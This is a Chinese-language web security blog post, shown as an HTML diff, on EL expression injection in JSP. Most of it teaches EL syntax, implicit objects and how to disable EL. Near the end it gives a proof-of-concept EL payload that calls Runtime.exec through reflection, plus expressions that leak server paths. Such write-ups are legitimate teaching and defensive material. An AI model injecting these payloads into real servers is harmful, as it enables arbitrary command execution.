@@ -1,0 +1,365 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>EL表达式注入漏洞 | ghtwf01</title><meta name="author" content="ghtwf01"><meta name="copyright" content="ghtwf01"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="EL表达式简介EL（Expression Language） 是为了使JSP写起来更加简单。它提供了在 JSP 中简化表达式的方法，让JSP的代码更加简化。 EL表达式主要功能如下：  获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）； 执行运">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EL表达式注入漏洞">
+<meta property="og:url" content="https://www.ghtwf01.com/2020/12/16/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="ghtwf01">
+<meta property="og:description" content="EL表达式简介EL（Expression Language） 是为了使JSP写起来更加简单。它提供了在 JSP 中简化表达式的方法，让JSP的代码更加简化。 EL表达式主要功能如下：  获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）； 执行运">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.ghtwf01.cn/img/avatar.png">
+<meta property="article:published_time" content="2020-12-16T04:53:43.000Z">
+<meta property="article:modified_time" content="2023-05-10T18:50:52.473Z">
+<meta property="article:author" content="ghtwf01">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.ghtwf01.cn/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.ghtwf01.com/2020/12/16/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'EL表达式注入漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-11 02:50:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://www.ghtwf01.cn/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="ghtwf01"><span class="site-name">ghtwf01</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">EL表达式注入漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-16T04:53:43.000Z" title="发表于 2020-12-16 12:53:43">2020-12-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-10T18:50:52.473Z" title="更新于 2023-05-11 02:50:52">2023-05-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="EL表达式注入漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="EL表达式简介"><a href="#EL表达式简介" class="headerlink" title="EL表达式简介"></a>EL表达式简介</h1><p>EL（Expression Language） 是为了使JSP写起来更加简单。它提供了在 JSP 中简化表达式的方法，让JSP的代码更加简化。</p>
+<p>EL表达式主要功能如下：</p>
+<ul>
+<li>获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）；</li>
+<li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如<code>$&#123;user==null&#125;</code>；</li>
+<li>获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据；</li>
+<li>调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法；</li>
+</ul>
+<h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="EL表达式语法"><a href="#EL表达式语法" class="headerlink" title="EL表达式语法"></a>EL表达式语法</h2><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以<code>$&#123;&#125;</code>表示。例如，<code>$&#123; userinfo&#125;</code>代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：<code>$&#123;pageScope. userinfo&#125;</code>表示访问page范围中的userinfo变量。</p>
+<p>简单地说，使用EL表达式语法：<code>$&#123;EL表达式&#125;</code></p>
+<p>其中，<strong>EL表达式和JSP代码等价转换</strong>。事实上，可以将EL表达式理解为一种简化的JSP代码。</p>
+<p>扩展JSP代码的写法总结：</p>
+<ul>
+<li><p>JSP表达式：<code>&lt;%=变量或表达式&gt;</code></p>
+<p>向浏览器输出变量或表达式的计算结果。</p>
+</li>
+<li><p>JSP脚本：<code>&lt;%Java代码%&gt;</code></p>
+<p>执行java代码的原理：翻译到_jspService()方法中。</p>
+</li>
+<li><p>JSP声明：<code>&lt;%!变量或方法%&gt;</code></p>
+<p>声明jsp的成员变量或成员方法。</p>
+</li>
+<li><p>JSP注释：<code>&lt;%!--JSP注释--%&gt;</code></p>
+<p>用于注释JSP代码，不会翻译到Java文件中，也不会执行。</p>
+</li>
+</ul>
+<p>示例代码</p>
+<p><img src="https://www.ghtwf01.cn/img/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
+<h2 id="与-运算符"><a href="#与-运算符" class="headerlink" title="[ ]与.运算符"></a>[ ]与.运算符</h2><p>EL表达式提供<code>.</code>和<code>[]</code>两种运算符来存取数据。</p>
+<p>当要存取的属性名称中包含一些特殊字符，如<code>.</code>或<code>-</code>等并非字母或数字的符号，就一定要使用<code>[]</code>。例如：<code>$&#123;user.My-Name&#125;</code>应当改为<code>$&#123;user[&quot;My-Name&quot;]&#125;</code>。</p>
+<p>如果要动态取值时，就可以用<code>[]</code>来做，而<code>.</code>无法做到动态取值。例如：<code>$&#123;sessionScope.user[data]&#125;</code>中data 是一个变量。</p>
+<h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><p>SP表达式语言提供以下操作符，其中大部分是Java中常用的操作符：</p>
+<table>
+<thead>
+<tr>
+<th align="left">术语</th>
+<th align="left">定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">算术型</td>
+<td align="left">+、-（二元）、*、&#x2F;、div、%、mod、-（一元）</td>
+</tr>
+<tr>
+<td align="left">逻辑型</td>
+<td align="left">and、&amp;&amp;、or、双管道符、!、not</td>
+</tr>
+<tr>
+<td align="left">关系型</td>
+<td align="left">&#x3D;&#x3D;、eq、!&#x3D;、ne、&lt;、lt、&gt;、gt、&lt;&#x3D;、le、&gt;&#x3D;、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td>
+</tr>
+<tr>
+<td align="left">空</td>
+<td align="left">empty 空操作符是前缀操作，可用于确定值是否为空。</td>
+</tr>
+<tr>
+<td align="left">条件型</td>
+<td align="left">A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td>
+</tr>
+</tbody></table>
+<h2 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h2><h3 id="pageContext对象"><a href="#pageContext对象" class="headerlink" title="pageContext对象"></a>pageContext对象</h3><p>pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.ghtwf01.cn/img/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png" alt="2"></p>
+<h3 id="Scope对象"><a href="#Scope对象" class="headerlink" title="Scope对象"></a>Scope对象</h3><table>
+<thead>
+<tr>
+<th align="left">术语</th>
+<th align="left">定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">pageScope</td>
+<td align="left">将页面范围的变量名称映射到其值。例如，EL 表达式可以使用<code>$&#123;pageScope.objectName&#125;</code>访问一个 JSP 中页面范围的对象，还可以使用<code>$&#123;pageScope .objectName. attributeName&#125;</code>访问对象的属性。</td>
+</tr>
+<tr>
+<td align="left">requestScope</td>
+<td align="left">将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用<code>$&#123;requestScope. objectName&#125;</code>访问一个 JSP 请求范围的对象，还可以使用<code>$&#123;requestScope. objectName. attributeName&#125;</code>访问对象的属性。</td>
+</tr>
+<tr>
+<td align="left">sessionScope</td>
+<td align="left">将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：<code>$&#123;sessionScope. name&#125;</code></td>
+</tr>
+<tr>
+<td align="left">applicationScope</td>
+<td align="left">将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。</td>
+</tr>
+</tbody></table>
+<p>pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。</p>
+<p>举例来说，如果需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  pageContext.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;page&quot;</span>);</span><br><span class="line">  request.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">  session.setAttribute(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;session&quot;</span>);</span><br><span class="line">  application.setAttribute(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;application&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">pageScope.name:$&#123;pageScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">requestScope.name : $&#123;requestScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">sessionScope.user : $&#123;sessionScope.user&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">applicationScope.user : $&#123;applicationScope.user&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.ghtwf01.cn/img/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png" alt="3"></p>
+<h3 id="另外一些隐式对象"><a href="#另外一些隐式对象" class="headerlink" title="另外一些隐式对象"></a>另外一些隐式对象</h3><p>此外，还提供几个隐式对象，允许对以下对象进行简易访问：</p>
+<table>
+<thead>
+<tr>
+<th align="left">术语</th>
+<th align="left">定义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">param</td>
+<td align="left">将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式<code>$&#123;param . name&#125;</code>相当于 request.getParameter (name)。</td>
+</tr>
+<tr>
+<td align="left">paramValues</td>
+<td align="left">将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 <code>$&#123;paramvalues. name&#125;</code> 相当于 request.getParamterValues(name)。</td>
+</tr>
+<tr>
+<td align="left">header</td>
+<td align="left">将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 <code>$&#123;header. name&#125;</code> 相当于 request.getHeader(name)。</td>
+</tr>
+<tr>
+<td align="left">headerValues</td>
+<td align="left">将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式<code>$&#123;headerValues. name&#125;</code>相当于 request.getHeaderValues(name)。</td>
+</tr>
+<tr>
+<td align="left">cookie</td>
+<td align="left">将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式<code>$&#123;cookie. name .value&#125;</code>返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用<code>$&#123;headerValues. name&#125;</code>表达式。</td>
+</tr>
+<tr>
+<td align="left">initParam</td>
+<td align="left">将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。</td>
+</tr>
+</tbody></table>
+<p><strong>param和paramValues对象</strong></p>
+<p>param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。</p>
+<p>举例来说，访问一个名为username的参数，可以这样使用表达式：${param.username}，或者${param[“username”]}。</p>
+<p><img src="https://www.ghtwf01.cn/img/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4.png" alt="4"></p>
+<p>paramValues返回的是一个字符串数组</p>
+<p><strong>header和headerValues对象</strong></p>
+<p>header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。</p>
+<p>举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：<code>$&#123;header.user-agent&#125;</code>，或者<code>$&#123;header[&quot;user-agent&quot;]&#125;</code>。</p>
+<p>接下来的例子表明了如何访问user-agent信息头：</p>
+<p><img src="https://www.ghtwf01.cn/img/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5.png" alt="5"></p>
+<p>headerValues返回的是一个字符串数组</p>
+<h2 id="EL表达式函数"><a href="#EL表达式函数" class="headerlink" title="EL表达式函数"></a>EL表达式函数</h2><p>EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;ns:func(param1, param2, ...)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推。比如，有函数fn:length，在JSTL库中定义，可以像下面这样来获取一个字符串的长度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;fn:length(&quot;Get my length&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用<code>&lt;taglib&gt;</code>标签在JSP文件中包含这些库。</p>
+<h2 id="EL表达式调用Java方法"><a href="#EL表达式调用Java方法" class="headerlink" title="EL表达式调用Java方法"></a>EL表达式调用Java方法</h2><p>新建一个Person类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package ghtwf01.demo;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    public void myname(String a) &#123;</span><br><span class="line">        System.out.println(&quot;My name is &quot;+a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着在WEB-INF文件夹下（除lib和classess目录外）新建test.tld文件，其中指定执行的Java方法及其URI地址：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">taglib</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>Person<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uri</span>&gt;</span>http://localhost:8888/Person<span class="tag">&lt;/<span class="name">uri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>myname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-class</span>&gt;</span>ghtwf01.demo.Person<span class="tag">&lt;/<span class="name">function-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-signature</span>&gt;</span> java.lang.String myname(java.lang.String)<span class="tag">&lt;/<span class="name">function-signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用<code>类名:方法名()</code>的形式来调用该类方法即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;Person&quot; uri=&quot;http://localhost:8888/Person&quot; %&gt;</span><br><span class="line">$&#123;Person:myname(&quot;ghtwf01&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.ghtwf01.cn/img/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6.png" alt="6"></p>
+<h1 id="JSP中启用-x2F-禁用EL表达式"><a href="#JSP中启用-x2F-禁用EL表达式" class="headerlink" title="JSP中启用&#x2F;禁用EL表达式"></a>JSP中启用&#x2F;禁用EL表达式</h1><h2 id="全局禁用EL表达式"><a href="#全局禁用EL表达式" class="headerlink" title="全局禁用EL表达式"></a>全局禁用EL表达式</h2><p>web.xml中进入如下配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp-config&gt;</span><br><span class="line">    &lt;jsp-property-group&gt;</span><br><span class="line">        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line">        &lt;el-ignored&gt;true&lt;/el-ignored&gt;</span><br><span class="line">    &lt;/jsp-property-group&gt;</span><br><span class="line">&lt;/jsp-config&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="单个文件禁用EL表达式"><a href="#单个文件禁用EL表达式" class="headerlink" title="单个文件禁用EL表达式"></a>单个文件禁用EL表达式</h2><p>在JSP文件中可以有如下定义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=&quot;true&quot; %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。</p>
+<p>JSP2.0中默认的启用EL表达式。</p>
+<p>例如如下的JSP代码禁用EL表达式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=&quot;true&quot; %&gt;</span><br><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.ghtwf01.cn/img/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7.png" alt="7"></p>
+<h1 id="EL表达式注入漏洞"><a href="#EL表达式注入漏洞" class="headerlink" title="EL表达式注入漏洞"></a>EL表达式注入漏洞</h1><p>EL表达式注入漏洞很简单，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p>
+<p>一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。</p>
+<p>POC:</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 执行命令</span></span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;open -a Calculator&quot;</span>))&#125;</span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2011-2730-Spring标签EL表达式漏洞"><a href="#CVE-2011-2730-Spring标签EL表达式漏洞" class="headerlink" title="CVE-2011-2730 Spring标签EL表达式漏洞"></a>CVE-2011-2730 Spring标签EL表达式漏洞</h2><p>首先需要Spring标签库spring.tld</p>
